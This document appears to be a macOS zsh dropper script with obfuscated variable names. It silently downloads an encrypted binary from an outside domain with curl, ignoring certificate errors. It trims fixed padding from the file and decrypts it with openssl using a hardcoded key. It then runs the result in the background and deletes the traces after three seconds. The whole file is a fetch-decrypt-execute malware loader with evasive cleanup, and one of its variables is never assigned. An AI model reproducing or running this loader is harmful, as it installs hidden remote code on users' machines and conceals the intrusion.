#!/bin/zsh
v4rhj=$(mktemp /tmp/ma2cvy.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m717c9f463b6f24b8.bin" -o "$v4rhjz" || exit 1
vjxn8k=$(stat -f %z "$v4rhjz"); qz566za=$(( vjxn8k - 3752 - 1897 ))
tail -c +$(( 3752 + 1 )) "$v4rhjz" | head -c $qz566za | openssl enc -d -aes-256-cbc -k 9ff7d3eb96cf7b6a79ce648c -out "$v4rhj" 2>/dev/null
[ -s "$v4rhj" ] && chmod 700 "$v4rhj" && ( "$v4rhj" & ) && disown
( sleep 3; rm -f "$v4rhj" "$v4rhjz" ) &>/dev/null &
